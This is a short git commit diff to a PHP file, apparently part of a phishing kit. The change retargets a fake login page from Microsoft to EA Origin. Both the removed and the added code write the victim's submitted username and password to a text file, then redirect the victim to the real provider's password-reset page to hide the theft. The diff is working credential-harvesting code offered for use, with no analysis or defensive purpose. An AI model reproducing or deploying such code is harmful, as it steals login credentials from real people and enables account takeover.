797d050810757f01463823a898e5643047e4a1d5
yash <yashvyavahare02@gmail.com>
2023-06-11 23:34:20 +0530

    Modifing origin page

--- .server/www/login.php
+++ .server/www/login.php
@@ -1,6 +1,6 @@
 <?php
 
-file_put_contents("usernames.txt", "Microsoft Username: " . $_POST['loginfmt'] . " Pass: " . $_POST['passwd'] . "\n", FILE_APPEND);
-header('Location: https://account.live.com/ResetPassword.aspx');
+file_put_contents("usernames.txt", "Origin Username: " . $_POST['email'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
+header('Location: https://signin.ea.com/p/originX/resetPassword?execution=e1430406479s1');
 exit();
 ?>
